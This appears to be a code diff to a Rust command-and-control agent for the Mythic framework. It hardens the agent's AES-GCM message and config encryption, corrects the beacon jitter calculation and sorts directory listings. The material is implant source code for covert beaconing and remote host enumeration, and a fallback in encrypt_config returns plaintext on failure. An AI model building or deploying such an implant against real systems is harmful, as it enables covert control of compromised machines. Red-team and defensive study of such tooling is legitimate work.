@@ -90,6 +90,7 @@ pub fn derive_key(secret: &[u8], salt: &str) -> [u8; 32] {
 }
 
 /// Build a Mythic wire message: UUID(36) + base64(nonce_12 || AES-256-GCM(json)).
+/// Returns an empty string on encryption failure instead of panicking.
 pub fn build_mythic_message(uuid: &str, payload_json: &str, key: &[u8; 32]) -> String {
     use aes_gcm::{
         aead::{Aead, KeyInit},
@@ -99,10 +100,14 @@ pub fn build_mythic_message(uuid: &str, payload_json: &str, key: &[u8; 32]) -> S
 
     let nonce_bytes = rand::random::<[u8; 12]>();
     let nonce = Nonce::from_slice(&nonce_bytes);
-    let cipher = Aes256Gcm::new_from_slice(key).expect("cipher init");
-    let ct = cipher
-        .encrypt(nonce, payload_json.as_bytes())
-        .expect("encrypt");
+    let cipher = match Aes256Gcm::new_from_slice(key) {
+        Ok(c) => c,
+        Err(_) => return String::new(),
+    };
+    let ct = match cipher.encrypt(nonce, payload_json.as_bytes()) {
+        Ok(c) => c,
+        Err(_) => return String::new(),
+    };
 
     let mut blob = Vec::with_capacity(12 + ct.len());
     blob.extend_from_slice(&nonce_bytes);
@@ -145,8 +150,14 @@ pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
     };
     let nonce_bytes = rand::random::<[u8; 12]>();
     let nonce = Nonce::from_slice(&nonce_bytes);
-    let cipher = Aes256Gcm::new_from_slice(key).expect("cipher init");
-    let ct = cipher.encrypt(nonce, data.as_bytes()).expect("encrypt");
+    let cipher = match Aes256Gcm::new_from_slice(key) {
+        Ok(c) => c,
+        Err(_) => return data.to_string(),
+    };
+    let ct = match cipher.encrypt(nonce, data.as_bytes()) {
+        Ok(c) => c,
+        Err(_) => return data.to_string(),
+    };
     let mut result = Vec::with_capacity(12 + ct.len());
     result.extend_from_slice(&nonce_bytes);
     result.extend_from_slice(&ct);
@@ -216,16 +227,15 @@ pub fn sleep(secs: u64) {
 }
 
 pub fn sleep_with_jitter(base: u64, jitter_pct: u32) {
-    if jitter_pct == 0 {
+    if jitter_pct == 0 || base == 0 {
         return sleep(base);
     }
-    let range = (base as f64 * jitter_pct as f64 / 100.0) as i64;
-    let jitter = (rand::random::<u64>() as i64 % (2 * range + 1)) - range;
-    let t = if jitter < 0 {
-        base.saturating_sub(jitter.unsigned_abs())
-    } else {
-        base.saturating_add(jitter as u64)
-    };
+    let range = base * jitter_pct as u64 / 100;
+    if range == 0 {
+        return sleep(base);
+    }
+    let offset = rand::random::<u64>() % (2 * range + 1);
+    let t = base.saturating_sub(range).saturating_add(offset);
     sleep(t.max(1));
 }
 
@@ -258,18 +268,21 @@ pub fn extract_param(parameters: &str, key: &str) -> String {
 
 pub fn list_dir(path: &str) -> String {
     match std::fs::read_dir(path) {
-        Ok(entries) => entries
-            .flatten()
-            .map(|e| {
-                let name = e.file_name().to_string_lossy().into_owned();
-                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
-                    format!("{}/", name)
-                } else {
-                    name
-                }
-            })
-            .collect::<Vec<_>>()
-            .join("\n"),
+        Ok(entries) => {
+            let mut items: Vec<String> = entries
+                .flatten()
+                .map(|e| {
+                    let name = e.file_name().to_string_lossy().into_owned();
+                    if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
+                        format!("{}/", name)
+                    } else {
+                        name
+                    }
+                })
+                .collect();
+            items.sort();
+            items.join("\n")
+        }
         Err(e) => format!("[-] {}", e),
     }
 }
@@ -492,9 +505,6 @@ pub fn run_c2_loop<F>(
         sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
     }
 }
-
-pub use base64;
-pub use serde_json;
 
 // ── Tests ──────────────────────────────────────────────────────────────────────
 
